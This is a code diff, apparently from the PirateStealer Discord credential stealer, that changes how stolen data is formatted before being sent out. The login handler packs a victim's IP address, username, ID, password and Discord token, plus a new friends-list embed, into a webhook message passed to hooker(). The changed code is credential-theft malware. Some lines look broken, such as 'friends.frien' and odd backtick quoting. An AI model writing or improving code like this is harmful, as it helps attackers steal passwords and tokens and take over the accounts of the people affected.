@@ -610,13 +610,18 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
+            name: 'Victim info',
+            value: `\`\`\`IP:  \n${config.ip}\n\`\`\``,
+            inline: false,
+          },
+          {
             name: 'Username',
             value: `\`${json.username}\``,
             inline: false,
           },
           {
             name: 'ID',
-            value: `${json.id}`,
+            value: `\`${json.id}\``,
             inline: true,
           },
           { 
@@ -642,16 +647,11 @@ const login = async (email, password, token) => {
           {
             name: 'Password',
             value: `\`${password}\``,
-            inline: true,
+            inline: false,
           },
           {
             name: 'Token',
-            value: `\`${token}\``,
-            inline: true,
-          },
-          {
-            name: 'IP',
-            value: `\`${config.ip}\``,
+            value: ` ````${token}```` `,
             inline: false,
           }
         ],
@@ -664,10 +664,22 @@ const login = async (email, password, token) => {
         },
         thumbnail: {
           url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        }
+    }, {
+        "title": `Total Friends (${friends.length})`,
+        "color": config['embed-color'],
+        "description": friends.frien,
+        "author": {
+            "name": "PirateStealer"
         },
-      },
-    ],
-  };
+        "footer": {
+            "text": "PirateStealer"
+        },
+        "thumbnail": {
+            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+        }
+    }]
+}
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
 };
